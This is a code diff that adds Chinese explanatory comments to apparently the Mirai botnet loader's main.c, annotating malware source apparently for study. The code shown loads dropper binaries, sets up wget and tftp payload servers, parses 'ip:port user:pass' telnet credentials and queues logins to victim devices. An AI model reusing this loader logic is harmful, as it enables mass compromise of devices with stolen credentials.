@@ -43,6 +43,7 @@ int main(int argc, char **args)
         id_tag = args[1];
     }
 
+    //加载所有二进制文件
     if (!binary_init())
     {
         printf("Failed to load bins/dlr.* as dropper\n");
@@ -50,6 +51,8 @@ int main(int argc, char **args)
     }
 
     /*                                                                                   wget address           tftp address */
+
+    //第一个参数是cpu的个数　　有多少个cpu就创建多少个线程
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
@@ -75,13 +78,15 @@ int main(int argc, char **args)
         }
 
         memset(&info, 0, sizeof(struct telnet_info));
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+        //解析telnet信息
         if (telnet_info_parse(strbuf, &info) == NULL)
             printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
         else
         {
             if (srv == NULL)
                 printf("srv == NULL 2\n");
-
+            //添加新节点，与新节点建立连接，添加进epoll中
             server_queue_telnet(srv, &info);
             if (total++ % 1000 == 0)
                 sleep(1);
